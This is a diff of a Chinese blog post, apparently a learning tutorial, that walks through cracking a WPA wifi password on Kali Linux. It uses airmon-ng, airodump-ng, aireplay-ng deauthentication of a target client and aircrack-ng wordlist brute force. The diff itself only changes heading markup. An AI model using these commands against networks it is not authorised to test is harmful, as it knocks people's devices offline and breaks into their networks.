@@ -387,30 +387,24 @@
         
           
             <p>新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。</p>
-<p>###启用无线网卡</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig wlan0 up</span><br></pre></td></tr></table></figure>
+<h3 id="启用无线网卡"><a href="#启用无线网卡" class="headerlink" title="启用无线网卡"></a>启用无线网卡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig wlan0 up</span><br></pre></td></tr></table></figure>
 <p><img src="/images/ifconfig wlan0 up.PNG" alt=""></p>
-<p>###开启网卡监听模式</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+<h3 id="开启网卡监听模式"><a href="#开启网卡监听模式" class="headerlink" title="开启网卡监听模式"></a>开启网卡监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
 <p><img src="/images/airmon-ng start wlan0.PNG" alt=""></p>
 <p>输入ifconfig命令查看网卡名称变为wlan0mon；<br>输入iwconfig命令确认mode为monitor模式。</p>
 <p><img src="/images/iwconfig.PNG" alt=""></p>
-<p>###扫描附近wifi热点</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+<h3 id="扫描附近wifi热点"><a href="#扫描附近wifi热点" class="headerlink" title="扫描附近wifi热点"></a>扫描附近wifi热点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
 <p><img src="/images/airodump-ng wlan0mon.PNG" alt=""></p>
 <p>BSSID是路由器MAC地址，CH是无线信道。</p>
-<p>###对目标路由器进行抓包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w <span class="built_in">cap</span> wlan0mon</span><br></pre></td></tr></table></figure>
+<h3 id="对目标路由器进行抓包"><a href="#对目标路由器进行抓包" class="headerlink" title="对目标路由器进行抓包"></a>对目标路由器进行抓包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w <span class="built_in">cap</span> wlan0mon</span><br></pre></td></tr></table></figure>
 <p><img src="/images/airodump-ng.PNG" alt=""></p>
 <p>-c：信道<br>–bssid：路由器MAC地址<br>-w：指定抓到的包存放文件</p>
 <p>此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。</p>
-<p>###将目标设备踢下线</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon</span><br></pre></td></tr></table></figure>
+<h3 id="将目标设备踢下线"><a href="#将目标设备踢下线" class="headerlink" title="将目标设备踢下线"></a>将目标设备踢下线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon</span><br></pre></td></tr></table></figure>
 <p><img src="/images/aireplay-ng.PNG" alt=""></p>
 <p>-0：发送n条认证消息<br>-a：路由器MAC地址<br>-c：目标设备MAC地址</p>
 <p>看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。</p>
-<p>###密码爆破</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aircrack-ng <span class="built_in">cap</span>-01.cap -w password.txt</span><br></pre></td></tr></table></figure>
+<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aircrack-ng <span class="built_in">cap</span>-01.cap -w password.txt</span><br></pre></td></tr></table></figure>
 
           
         
